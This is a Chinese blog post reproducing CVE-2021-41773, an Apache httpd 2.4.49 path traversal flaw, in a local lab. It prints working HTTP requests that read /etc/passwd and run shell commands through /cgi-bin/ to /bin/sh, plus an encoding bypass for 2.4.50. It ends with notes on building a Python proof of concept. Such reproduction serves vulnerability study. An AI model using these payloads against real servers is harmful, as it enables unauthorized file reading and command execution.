# CVE-2021-41773 Apache Httpd Server 漏洞复现 - Zh1z3ven - 博客园

> 原文：[`www.cnblogs.com/CoLo/p/15400232.html`](https://www.cnblogs.com/CoLo/p/15400232.html)

# CVE-2021-41773 Apache Httpd Server 漏洞复现

## 0x00 写在前面

很久没写~~水~~漏洞复现的文章了，水一篇。

## 0x01 漏洞简介

是目录穿越文件读取漏洞，漏洞只影响 2.4.49，2.4.50 不完全修复可绕过，如果开启`mod_cgi`可 RCE

详情可参考下面链接

[`twitter.com/h4x0r_dz/status/1445384417908862977?s=20`](https://twitter.com/h4x0r_dz/status/1445384417908862977?s=20)

[`zh-cn.tenable.com/blog/cve-2021-41773-path-traversal-zero-day-in-apache-http-server-exploited?tns_redirect=true`](https://zh-cn.tenable.com/blog/cve-2021-41773-path-traversal-zero-day-in-apache-http-server-exploited?tns_redirect=true)

[`cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)

[`mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488695&idx=1&sn=93cc8e0b903e073b2ec5f56baae05c8c&chksm=c172ceabf60547bd7084dbc30283b124de404086adcac29cac09c261682af6207e83914f8971&mpshare=1&scene=23&srcid=1011i7EQtc88ryHEEnWw9Ib1&sharer_sharetime=1633916866195&sharer_shareid=89d9b45c74ce6f3b746404e9dd2f124d%23rd`](https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488695&idx=1&sn=93cc8e0b903e073b2ec5f56baae05c8c&chksm=c172ceabf60547bd7084dbc30283b124de404086adcac29cac09c261682af6207e83914f8971&mpshare=1&scene=23&srcid=1011i7EQtc88ryHEEnWw9Ib1&sharer_sharetime=1633916866195&sharer_shareid=89d9b45c74ce6f3b746404e9dd2f124d%23rd)

## 0x02 漏洞复现

这里用的 https://github.com/blasty/CVE-2021-41773 项目起的环境

![](img/261bd40136e6c0cdb6443bcf28a1f43d.png)

文件读取

```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 127.0.0.1:8080 
```

![](img/19ec578725dbb28fbb86a5558ba0d9e7.png)

RCE

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/plain
Content-Length: 8

echo; id 
```

![](img/e141349e7e757dee7d1c2e48c9f97313.png)

2.4.50 版本暂未复现，payload 中目录穿越部分换为`.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65`即可

## 0x03 poc 编写

主要记录下写 poc 时踩的坑，本人用的 python3.9.6 一开始用的 requests 库，但是发现 requests 库在发送 http 请求时会自己先对 url 进行处理，而不会直接将我们在脚本中写好的 url 直接发过去。

部分源码如下：

![](img/da0a4e957245603e87cbe6356ebe6e6a.png)

报错如下：

![](img/acfb2c0f7b96d7d40a0e2360441297b3.png)

而 burp 发过去就是很正常的，最后查看日志时发现了问题

error.log:

![](img/81fc66d291e81b01d0676467a1c41a97.png)

access.log

![](img/8301d258e1f38c4b5e2188005dc5a22b.png)

**结果：burp 传过去在 log 里看是有 url 编码的，requests 过去的在发送前已经先做了一次 urldecode**

这里没有 debug 跟源码，用 urllib.request 作为请求库就解决了

![](img/a4cda3da9657a8d7952f5b62419c0df6.png)

![](img/8f8095e1dde1c75c176835c9276113cd.png)